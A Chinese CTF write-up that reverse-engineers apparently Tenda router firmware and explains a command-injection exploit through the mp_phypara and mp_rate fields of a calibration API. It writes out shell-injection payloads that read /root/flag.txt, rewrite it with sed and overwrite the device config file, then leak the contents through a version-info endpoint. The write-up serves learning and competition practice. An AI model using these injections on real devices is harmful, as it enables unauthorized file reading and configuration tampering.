二.逆向分析

由于固件的大小，所以不大可能把漏洞点设置在栈溢出，所以我们这里优先去考虑命令执行。

所以我们优先对system和popen去搜索，交叉引用。

popen函数原型如下

  • command：要执行的 Shell 命令字符串。
  • type：通信模式。
    • "r"（读）：父进程可以读取子进程的命令执行结果（即命令的 stdout 标准输出）。
    • "w"（写）：父进程可以向子进程的 stdin 标准输入写入数据。
  • 返回值：返回一个 FILE \* 文件流指针。可以像操作普通文件一样，用 fread、fgets、fwrite 来读取或写入命令的输出/输入。
  • pclose：用于关闭文件流指针，并等待子进程结束，返回子进程的退出状态码。

popen ，它底层封装了三个关键的系统调用：

  1. fork()：创建一个子进程。
  2. exec()：在子进程中调用 /bin/sh -c "命令"，启动一个 Shell 来解析并执行命令。
  3. pipe()：创建一根“管道”，连接父进程和子进程。如果 type 是 "r"，管道连接的是子进程的 stdout 到父进程的读端；如果是 "w"，连接的是父进程的写端到子进程的 stdin。

popen = 启动一个 Shell 执行命令 + 允许 C 程序像读文件一样读取命令的输出。

经过分析，发现system函数的参数，一部分是其他int类型函数的返回值，另一部分是硬编码在程序中的，我们不是很好控制。所以我们转去分析popen函数。

通过交叉引用第一个popen，我们就有了重大的发现。

sub_7D98C 的本质是一个 “批量命令执行器”：

  1. 通过 v4 << 6 的索引方式，要求调用者按 64 字节对齐存放命令。
  2. 循环调用 popen 执行每条命令，遇错即停。
  3. 最终由返回值控制上层业务逻辑的状态（成功/失败）。

但是我们可以找到一个接口Tenda_mfg_htmlVersionInfo

核心逻辑是从设备持久化存储（实际是 /opt/sav/Config/device.conf）中提取键值对，并打包进 JSON 响应。

关键执行流如下：

  1. 匹配方法：当 method 为 Tenda_mfg_htmlVersionInfo 时进入分支。
  2. 读取键值：多次调用 sub_7EA34(a1, [KEY], &s_)，这个函数的作用就是从 a1中根据 KEY 取出对应的 VALUE 字符串。
  3. 回显填充：通过 sub_171858(v584, "param") 获取请求中的 param，再用 sub_170074 将读取到的值赋值给响应中的对应字段。
  4. 最终效果：只要 device.conf 中 mac_info=FLAG{xxx}，那么调用该接口，返回的报文中 MAC 字段就会直接显示 FLAG{xxx}。

sub_7EA34 本质上是一个 “基于白名单路径的配置读取器”。它原本设计用于安全地读取设备固化配置。

给出exp的解释，这也是我第一次接触发送报文需要一定格式的脚本。所以直接抄的我师傅的，唉，还是有很多要学的地方。

  • json.dumps(payload, separators=(",", ":"))：将 Python 字典 payload 转为 JSON 字符串。

    • separators=(",", ":") 的作用是移除 JSON 中多余的空。默认情况下，JSON 会带空格（如 {"method": "PTR"}），加上这个参数后变成 {"method":"PTR"}。这能减少网络传输量，同时避免某些服务端对空格敏感。

  • .encode()：将 JSON 字符串按 UTF-8 编码成字节流（bytes），因为 Socket 只能发送字节。

  • + b"\n"：在数据末尾追加一个换行符（字节形式）。这是一个协议分隔符——服务端检测到 \n 就认为报文结束（见下方接收循环的 if b"\n" in out）。

  • socket.create_connection((HOST, PORT), timeout=timeout)：这是一个工厂函数，创建 TCP 客户端套接字并连接到目标地址。

  • with ... as sock：上下文管理器。无论代码块是否异常结束，都会自动调用 sock.close() 释放端口资源，避免资源泄露。

  • out = b""：初始化一个空字节串，用于累积接收到的数据。

  • while True：无限循环，直到遇到 break 退出。

  • chunk = sock.recv(8192)：每次最多读取 8192 字节。

    • 如果返回空字节 b""，说明对端关闭了连接，此时 break。

  • out += chunk：将读取到的数据拼接到总缓冲区。

  • if b"\n" in out: break：一旦发现累积数据中包含换行符，说明收到了完整的消息帧，立即退出循环（不再等待更多数据）。

  • out.decode(errors="replace")：将字节串按 UTF-8 解码为字符串。

    • errors="replace" 是个容错机制：如果遇到非法 UTF-8 字节，不会抛出异常，而是用（U+FFFD）替换，保证程序不会因为网络杂音而崩溃。

  • def cmd(**param)：定义函数 cmd，使用 ** 关键字参数收集语法。

    • 当你调用 cmd(mp_phypara=";cat ...") 时，param 会自动变成一个字典：{'mp_phypara': ';cat ...'}。

  • 函数体：构造一个符合目标 API 格式的字典 {"method": "PTRfTxCali", "param": param}，然后调用 udp 发送并返回响应。

  • 发送一个合法的查询请求给 Tenda_mfg_htmlVersionInfo 接口，param 为空对象。此时服务端会从被篡改的 /opt/sav/Config/device.conf 中读取配置，并将其填充到响应 JSON 中。

  • re.search(r'"MAC":"(.\*?)"', resp)：正则搜索。

    • r"..." 是原始字符串，防止反斜杠被转义。
    • "MAC":"(.*?)"：精确匹配 JSON 中的 MAC 字段，(.*?) 是非贪婪捕获组，只匹配到最近的 " 为止，防止跨字段匹配。

  • m.group(1)：取出正则捕获的第一组内容（即 MAC 字段的值，也就是 Flag）。

  • .encode()：将字符串转为字节流。

  • .decode("unicode_escape")：这是转义还原语法。服务端返回的 JSON 中，特殊字符（如换行符 \n、双引号 \"）会被转义。这行代码将 \n 还原为真正的换行符，\\ 还原为 \，保证输出与原始文件完全一致。

  • .strip()：移除字符串首尾的空白字符（如 fgets 可能残留的换行符）。

  • 第一次注入（读取原始 Flag）：

    • 利用 mp_phypara 字段注入，Payload 为 ;cat /root/flag.txt>/tmp/f。
    • ;：分号是 Shell 命令分隔符，结束前面的 rtwpriv 命令。
    • cat /root/flag.txt：读取 Flag 文件内容。
    • >：输出重定向，将 cat 的结果写入 /tmp/f（覆盖模式）。
    • 目的：把敏感数据从受限制目录“搬运”到可随意操作的临时目录。

  • 第二次注入（格式化数据）：

    • 利用同样的 mp_phypara 字段，执行 sed 命令。
    • sed -i：-i 表示直接修改文件（in-place），不输出到屏幕。
    • s/^/mac_info=/：这是 sed 的替换语法。
      • s 是替换命令。
      • / 是分隔符。
      • ^ 是正则表达式的行首锚点。
      • 整句意思：在文件的每一行开头插入 mac_info=。
    • 效果：假设 /tmp/f 内容为 NepCTF{...}，执行后变为 mac_info=NepCTF{...}，使其符合配置文件的键值对格式。

  • 第三次注入（投毒配置文件）：

    • 这次换用 mp_rate*字段注入，执行 cp 命令。
    • cp /tmp/f /opt/sav/Config/device.conf：强制将格式化后的临时文件复制（覆盖）到设备启动时读取的核心配置路径。
    • 为什么换字段？一是为了证明该程序多处参数存在注入；二是避免连续使用同一参数触发服务端的某种“去重”或“状态锁”机制。
